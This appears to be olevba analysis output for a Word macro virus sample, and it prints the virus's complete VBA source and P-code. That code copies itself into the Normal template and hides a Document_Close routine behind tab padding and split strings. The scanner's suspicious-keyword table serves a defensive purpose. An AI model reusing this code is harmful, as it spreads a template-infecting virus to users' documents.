olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Reccode
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Reccode - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim NTmp As Object
Set NTmp = Normal.ThisDocument
Dim Adc As Object
Set Adc = Project.ThisDocument
Dim TDc As Object
Set TDc = ThisDocument
Set AC = Adc.VBProject.VBComponents(1).CodeModule
Set NC = NTmp.VBProject.VBComponents(1).CodeModule
Set TD = TDc.VBProject.VBComponents(1).CodeModule
NTmp.Variables("RecCode").Value = TD.Lines(1, TD.CountOfLines)
Adc.Variables("RecCode").Value = TD.Lines(1, TD.CountOfLines)
UnstealthA = "With ThisDo" & "cument.VBPr" & "oject." & "VBCompo" & "nents(1" & ").CodeModule: "
UnstealthB = ".DeleteL" & "ines 1" & ", .CountO" & "fLines: "
UnStealthC = ".InsertLin" & "es 1, T" & "hisDo" & "cument.Variab" & "les(1)" & ".Value: "
UnStealthD = "End With"
UnStealth = String(175, Chr(9)) & "If ShowVisualBasicEditor = True Then Exit Sub: " & UnstealthA & UnstealthB & UnStealthC & UnStealthD
NC.DeleteLines 1, NC.CountOfLines: NC.InsertLines 1, "Private Sub Document_Close" & Chr(13) & UnStealth & Chr(13) & "End Sub"
AC.DeleteLines 1, AC.CountOfLines: AC.InsertLines 1, "Private Sub Document_Close" & Chr(13) & UnStealth & Chr(13) & "End Sub"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Reccode
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5879 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Dim 
' 	VarDefn NTmp (As Object)
' Line #2:
' 	SetStmt 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	Set NTmp 
' Line #3:
' 	Dim 
' 	VarDefn Adc (As Object)
' Line #4:
' 	SetStmt 
' 	Ld Project 
' 	MemLd ThisDocument 
' 	Set Adc 
' Line #5:
' 	Dim 
' 	VarDefn TDc (As Object)
' Line #6:
' 	SetStmt 
' 	Ld ThisDocument 
' 	Set TDc 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Adc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AC 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NTmp 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NC 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld TDc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set TD 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld TD 
' 	MemLd CountOfLines 
' 	Ld TD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "RecCode"
' 	Ld NTmp 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' Line #11:
' 	LitDI2 0x0001 
' 	Ld TD 
' 	MemLd CountOfLines 
' 	Ld TD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "RecCode"
' 	Ld Adc 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' Line #12:
' 	LitStr 0x000B "With ThisDo"
' 	LitStr 0x000B "cument.VBPr"
' 	Concat 
' 	LitStr 0x0006 "oject."
' 	Concat 
' 	LitStr 0x0007 "VBCompo"
' 	Concat 
' 	LitStr 0x0007 "nents(1"
' 	Concat 
' 	LitStr 0x000E ").CodeModule: "
' 	Concat 
' 	St UnstealthA 
' Line #13:
' 	LitStr 0x0008 ".DeleteL"
' 	LitStr 0x0006 "ines 1"
' 	Concat 
' 	LitStr 0x0009 ", .CountO"
' 	Concat 
' 	LitStr 0x0008 "fLines: "
' 	Concat 
' 	St UnstealthB 
' Line #14:
' 	LitStr 0x000A ".InsertLin"
' 	LitStr 0x0007 "es 1, T"
' 	Concat 
' 	LitStr 0x0005 "hisDo"
' 	Concat 
' 	LitStr 0x000D "cument.Variab"
' 	Concat 
' 	LitStr 0x0006 "les(1)"
' 	Concat 
' 	LitStr 0x0008 ".Value: "
' 	Concat 
' 	St UnStealthC 
' Line #15:
' 	LitStr 0x0008 "End With"
' 	St UnStealthD 
' Line #16:
' 	LitDI2 0x00AF 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	LitStr 0x002F "If ShowVisualBasicEditor = True Then Exit Sub: "
' 	Concat 
' 	Ld UnstealthA 
' 	Concat 
' 	Ld UnstealthB 
' 	Concat 
' 	Ld UnStealthC 
' 	Concat 
' 	Ld UnStealthD 
' 	Concat 
' 	St UnStealth 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld NC 
' 	MemLd CountOfLines 
' 	Ld NC 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x001A "Private Sub Document_Close"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld UnStealth 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld NC 
' 	ArgsMemCall InsertLines 0x0002 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld AC 
' 	MemLd CountOfLines 
' 	Ld AC 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x001A "Private Sub Document_Close"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld UnStealth 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld AC 
' 	ArgsMemCall InsertLines 0x0002 
' Line #19:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

